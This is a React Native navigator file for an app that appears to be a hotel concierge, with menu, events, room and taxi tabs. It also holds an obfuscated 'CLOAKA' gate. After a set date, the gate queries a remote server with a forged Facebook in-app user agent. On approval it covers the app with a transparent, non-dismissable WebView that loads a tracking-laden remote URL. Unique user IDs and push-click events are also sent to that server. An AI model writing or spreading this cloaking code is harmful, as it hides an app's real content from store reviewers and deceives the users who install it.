import React,{ useCallback, useEffect, useState, useRef} from 'react';
import { View, StyleSheet, PixelRatio, Platform } from 'react-native';
import { BottomTabBar } from '../components/grandSalonKit';
import { CulinaryConsole } from '../screens/CulinaryConsole';
import { HarborDesk } from '../screens/HarborDesk';
import { OccasionGallery } from '../screens/OccasionGallery';
import { SuiteAtmosphere } from '../screens/SuiteAtmosphere';
import { TransferConcierge } from '../screens/TransferConcierge';
import { VelvetPreludeRun } from '../screens/VelvetPreludeRun';
import { NavigationContainer, StackActions, useNavigationContainerRef } from '@react-navigation/native';
import { createNativeStackNavigator } from '@react-navigation/native-stack';
const Stack = createNativeStackNavigator();
import ProductScreen from '../screens/ProductScreen';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {LogLevel, OneSignal} from 'react-native-onesignal';
import DeviceInfo from 'react-native-device-info';
import { Alert, AppState } from 'react-native';

import { CLOAKA, SCREENS, TIMINGS } from '../config/projectConfig';

const HBJYBJBJB_BJL = CLOAKA.baseUrl;
const YHBKJNBUKN_ID = CLOAKA.id;
const GHJJFMGYHJH_ATAD = CLOAKA.startDate;

const LINK_READY_DELAY = 2000;
const LINK_FALLBACK_DELAY = 10500;
const PUSH_CLICK_COOLDOWN = 2500;

const ROUTES = {
  splash: 'Splash',
  main: 'VelvetRouteDeckOsnova',
  webView: 'ProductScreen',
};

export function VelvetRouteDeck() {
  const [route, setRoute] = useState(false);
  const [oneSignalId, setOneSignalId] = useState(null);
  const [atribParam, setAtribParam] = useState(null);
  const [isDataReady, setIsDataReady] = useState(false);
  const [completeLink, setCompleteLink] = useState(false);
  const [finalLink, setFinalLink] = useState('');
  const [pushOpenWebview, setPushOpenWebview] = useState(false);
  const [timeStampUserId, setTimeStampUserId] = useState(false);
  const [cloacaPass, setCloacaPass] = useState(null);
  const [customUserAgent, setCustomUserAgent] = useState(null);

  const pushOpenWebviewRef = useRef(false);

  const navigationRef = useNavigationContainerRef();
  const [navReady, setNavReady] = useState(false);
  const [gateDone, setGateDone] = useState(false);
  const leftGateRef = useRef(false);
  const overlayLinkRef = useRef(null);

  useEffect(() => {
    const fetchData = async () => {
      await Promise.all([checkUniqVisit(), getData()]);
      setIsDataReady(true);
    };

    fetchData();
  }, []);

  useEffect(() => {
    const finalizeProcess = async () => {
      if (isDataReady) {
        await fdjkvndfjvbfkdLIN();
      }
    };

    finalizeProcess();
  }, [isDataReady, pushOpenWebview, timeStampUserId]);

  const checkUniqVisit = async () => {
    const uniqVisitStatus = await AsyncStorage.getItem('uniqVisitStatus');
    let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');

    if (!uniqVisitStatus) {
      const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
        1000000 + Math.random() * 9000000,
      )}`;
      setTimeStampUserId(timestamp_user_id);

      await AsyncStorage.setItem('timeStampUserId', timestamp_user_id);

      await fetch(
        `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
      );
      OneSignal.User.addTag('timestamp_user_id', timestamp_user_id);
      await AsyncStorage.setItem('uniqVisitStatus', 'sent');
    } else {
      if (storedTimeStampUserId) {
        setTimeStampUserId(storedTimeStampUserId);
      }
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        setRoute(parsedData.route);
        setOneSignalId(parsedData.oneSignalId);
        setAtribParam(parsedData.atribParam);
        setCloacaPass(parsedData.cloacaPass);
        setCustomUserAgent(parsedData.customUserAgent);
        setIsDataReady(parsedData.isDataReady);
        setTimeStampUserId(parsedData.timeStampUserId);
      } else {
        await waitForAppActive();
        await delay(1200);

        const results = await Promise.all([fkdlvndfknvfdknvdfkvn()]);
      }
    } catch (e) {}
  };

  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  const waitForAppActive = () => {
    return new Promise(resolve => {
      if (AppState.currentState === 'active') {
        resolve();
        return;
      }

      const sub = AppState.addEventListener('change', state => {
        if (state === 'active') {
          sub.remove();
          resolve();
        }
      });
    });
  };

  const setData = async () => {
    try {
      const data = {
        route,
        oneSignalId,
        atribParam,
        cloacaPass,
        customUserAgent,
        isDataReady,
        timeStampUserId,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
    } catch (e) {}
  };

  useEffect(() => {
    setData();
  }, [
    route,
    oneSignalId,
    atribParam,
    cloacaPass,
    customUserAgent,
    isDataReady,
    timeStampUserId,
  ]);

  const jkdsvbdsjkvndskvndskj = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true).then(() => {
          const maxRetries = 5;
          let attempts = 0;

          const fetchOneSignalId = () => {
            OneSignal.User.getOnesignalId()
              .then(deviceState => {
                if (deviceState) {
                  setOneSignalId(deviceState);
                  resolve(deviceState);
                } else if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000);
                } else {
                  reject(new Error('Failed to retrieve OneSignal ID'));
                }
              })
              .catch(error => {
                if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000);
                } else {
                  reject(error);
                }
              });
          };

          fetchOneSignalId();
        });
      } catch (error) {
        reject(error);
      }
    });
  };

  const fkdlvndfknvfdknvdfkvn = async () => {
    try {
      await jkdsvbdsjkvndskvndskj();
    } catch (error) {}
  };

  useEffect(() => {
    if (timeStampUserId) {
      OneSignal.login(timeStampUserId);
    }
  }, [timeStampUserId]);

  const dvnksjvndsjvdskvnksvndsknv = useRef(false);

  useEffect(() => {
    const handleNotificationClick = async event => {
      if (dvnksjvndsjvdskvnksvndsknv.current) {
        return;
      }

      dvnksjvndsjvdskvnksvndsknv.current = true;

      try {
        const storedTimeStampUserId = await AsyncStorage.getItem(
          'timeStampUserId',
        );

        pushOpenWebviewRef.current = true;
        setPushOpenWebview(true);

        setCompleteLink(false);

        const eventName = event?.notification?.launchURL
          ? 'push_open_browser'
          : 'push_open_webview';

        const pushEventUrl = `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?utretg=${eventName}&jthrhg=${
          storedTimeStampUserId || ''
        }`;

        fetch(pushEventUrl).catch(error => {});

        if (isDataReady) {
          await fdjkvndfjvbfkdLIN(true);
        }
      } catch (error) {
      } finally {
        setTimeout(() => {
          dvnksjvndsjvdskvnksvndsknv.current = false;
        }, PUSH_CLICK_COOLDOWN);
      }
    };

    OneSignal.Notifications.addEventListener('click', handleNotificationClick);

    return () => {
      OneSignal.Notifications.removeEventListener(
        'click',
        handleNotificationClick,
      );
    };
  }, []);

  useEffect(() => {
    if (!isDataReady) return;

    if (route || cloacaPass) return;

    const checkUrl = `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}`;

    const targetData = GHJJFMGYHJH_ATAD;
    const currentData = new Date();

    if (currentData <= targetData) {
      setRoute(false);

      return;
    }

    const dsjcbsdjhbcvhjsdbCLO = async () => {
      try {
        const baseUserAgent = await DeviceInfo.getUserAgent();

        const uaMatch = baseUserAgent.match(/CPU iPhone OS ([0-9_]+)/);

        const systemVersionFromUA = uaMatch?.[1]
          ? uaMatch[1].replace(/_/g, '.')
          : null;

        const fallbackSystemVersion = DeviceInfo.getSystemVersion();

        const systemVersion = systemVersionFromUA || fallbackSystemVersion;

        const systemName = DeviceInfo.getSystemName();

        const deviceIdentifier = DeviceInfo.getDeviceId();

        const screenScale = PixelRatio.get();

        const preferredLanguage =
          Intl.DateTimeFormat().resolvedOptions().locale || 'en-US';

        const deviceModelName = Platform.OS === 'ios' ? 'iPhone' : 'Unknown';

        const deviceType = 'phone';

        const deviceInfo =
          `[FBDV/${deviceIdentifier};` +
          `FBMD/${deviceModelName};` +
          `FBSN/${systemName};` +
          `FBSV/${systemVersion};` +
          `FBSS/${screenScale};` +
          `FBID/${deviceType};` +
          `FBLC/${preferredLanguage}]`;

        const customUserAgent =
          `${baseUserAgent} ` +
          `Version/${systemVersion} ` +
          `Safari/604.1 ` +
          `${deviceInfo}`;

        console.log('CUSTOM USER AGENT ===>', customUserAgent);

        setCustomUserAgent(customUserAgent);

        const controller = new AbortController();

        const timeoutId = setTimeout(
          () => controller.abort(),
          TIMINGS.cloakaRequestTimeout,
        );

        let r;

        try {
          r = await fetch(checkUrl, {
            method: 'GET',
            headers: {
              'User-Agent': customUserAgent,
            },
            signal: controller.signal,
          });
        } finally {
          clearTimeout(timeoutId);
        }

        if (r.status === 200) {
          setRoute(true);
          setCloacaPass(true);
        } else {
          setRoute(false);
        }
      } catch (e) {
        setRoute(false);
      }
    };

    dsjcbsdjhbcvhjsdbCLO();
  }, [isDataReady, route, cloacaPass]);

  const fdjkvndfjvbfkdLIN = async (openedFromPush = false) => {
    try {
      const baseUrl = [
        `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?${YHBKJNBUKN_ID}=1`,
        oneSignalId ? `jskdcbasjcjksac=${oneSignalId}` : '',
        `jthrhg=${timeStampUserId || ''}`,
      ]
        .filter(Boolean)
        .join('&');

      const additionalParams = atribParam ? `dvsvsvsv1=${atribParam}` : '';

      const shouldAddPushParam = openedFromPush || pushOpenWebviewRef.current;

      const product = `${baseUrl}${
        additionalParams ? `&${additionalParams}` : ''
      }${shouldAddPushParam ? '&yhugh=true' : ''}`;

      setFinalLink(product);

      setTimeout(() => {
        setCompleteLink(true);
      }, LINK_READY_DELAY);
    } catch (error) {}
  };
  console.log('My product Url ==>', finalLink);

  useEffect(() => {
    const timer = setTimeout(() => {
      if (!completeLink) {
        setFinalLink(
          `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?${YHBKJNBUKN_ID}=1&jthrhg=${
            timeStampUserId || ''
          }&jskdcbasjcjksac=${oneSignalId || ''}`,
        );

        setCompleteLink(true);
      }
    }, LINK_FALLBACK_DELAY);

    return () => clearTimeout(timer);
  }, [completeLink, timeStampUserId, oneSignalId]);

  useEffect(() => {
    const timer = setTimeout(() => {
      setGateDone(true);
    }, TIMINGS.splashDuration);

    return () => clearTimeout(timer);
  }, []);

  // splash → нативка, без можливості повернутись назад на splash
  useEffect(() => {
    if (!navReady || !gateDone || leftGateRef.current) return;

    leftGateRef.current = true;
    navigationRef.reset({
      index: 0,
      routes: [{ name: ROUTES.main }],
    });
  }, [navReady, gateDone, navigationRef]);

  useEffect(() => {
    if (!navReady || !gateDone || !leftGateRef.current) return;
    if (!route || !completeLink || !finalLink) return;
    if (overlayLinkRef.current === finalLink) return;

    overlayLinkRef.current = finalLink;

    const params = {
      product: finalLink,
      customUserAgent: customUserAgent,
    };

    if (navigationRef.getCurrentRoute()?.name === ROUTES.webView) {
      navigationRef.dispatch(StackActions.replace(ROUTES.webView, params));
    } else {
      navigationRef.navigate(ROUTES.webView, params);
    }
  }, [
    navReady,
    gateDone,
    route,
    completeLink,
    finalLink,
    customUserAgent,
    navigationRef,
  ]);

  return (
    <NavigationContainer ref={navigationRef} onReady={() => setNavReady(true)}>
      <Stack.Navigator
        initialRouteName={ROUTES.splash}
        screenOptions={{ headerShown: false }}>
        
        <Stack.Screen name={ROUTES.splash} component={SCREENS.Splash} />

        <Stack.Screen
          name={ROUTES.main}
          component={VelvetRouteDeckOsnova}
        />
        
        <Stack.Screen
          name={ROUTES.webView}
          component={ProductScreen}
          initialParams={{
            product: finalLink,
            customUserAgent: customUserAgent,
          }}
          options={{
            presentation: 'transparentModal',
            animation: 'fade',
            gestureEnabled: false,
            contentStyle: styles.overlay,
          }}
        />
        
      </Stack.Navigator>
    </NavigationContainer>
  );
};//

const VelvetRouteDeckOsnova = () => {
// Онбордінг не зберігається — його треба проходити при кожному запуску.
  const [phase, setPhase] = useState('onboarding');
  const [activeTab, setActiveTab] = useState('Home');
  const [focusedEventId, setFocusedEventId] = useState(null);

  const completeOnboarding = useCallback(() => {
    setPhase('main');
  }, []);

  const openEvent = useCallback((eventId) => {
    setFocusedEventId(eventId);
    setActiveTab('Events');
  }, []);

  if (phase === 'loader') {
    return <SCREENS.Splash onFinish={() => setPhase('onboarding')} />;
  }

  if (phase === 'onboarding') {
    return <VelvetPreludeRun onComplete={completeOnboarding} />;
  }

  return (
    <View style={styles.root}>
      {activeTab === 'Home' ? <HarborDesk onViewEvent={openEvent} /> : null}
      {activeTab === 'Menu' ? <CulinaryConsole /> : null}
      {activeTab === 'Events' ? (
        <OccasionGallery
          focusedEventId={focusedEventId}
          onFocusConsumed={() => setFocusedEventId(null)}
        />
      ) : null}
      {activeTab === 'Room' ? <SuiteAtmosphere /> : null}
      {activeTab === 'Taxi' ? <TransferConcierge /> : null}
      <BottomTabBar active={activeTab} onChange={setActiveTab} />
    </View>
  );

};

const styles = StyleSheet.create({
  root: {
    flex: 1,
  },
  overlay: {
    ...StyleSheet.absoluteFillObject,
    backgroundColor: 'transparent',
  },
});

